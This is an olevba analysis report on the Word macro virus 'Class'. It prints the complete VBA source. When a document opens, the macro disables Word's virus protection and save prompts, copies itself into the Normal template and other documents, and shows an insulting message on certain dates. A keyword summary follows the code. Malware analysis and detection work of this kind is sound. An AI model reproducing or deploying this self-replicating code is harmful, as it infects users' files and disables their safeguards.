olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-ca9d22b50944ecf7cb5af2253ef19c71294f0e2c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-ca9d22b50944ecf7cb5af2253ef19c71294f0e2c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
On Error GoTo out
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
Options.VirusProtection = False
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
Options.SaveNormalPrompt = False
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
Options.ConfirmConversions = False
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
If nt > 70 And ad > 0 Then GoTo out
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
If nt < 70 Then
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
End If
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
host.codemodule.AddFromFile ("c:\class.sys")
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
With host.codemodule
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
    For x = 1 To 4
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
    .deletelines 1
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
    Next x
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
End With
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
If nt < 70 Then
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
    With host.codemodule
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
    .replaceline 1, "Sub AutoClose()"
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
    .replaceline 71, "Sub ToolsMacro()"
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
    End With
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
End If
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
With host.codemodule
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
    For x = 2 To 72 Step 2
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
    Next x
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
End With
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
out:
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
End Sub
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
Sub ViewVBCode()
'COMUNE DI NAPOLI09/12/99 9.58.33Brother HL-760 series on LPT1:JOB18.DOCClippy
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

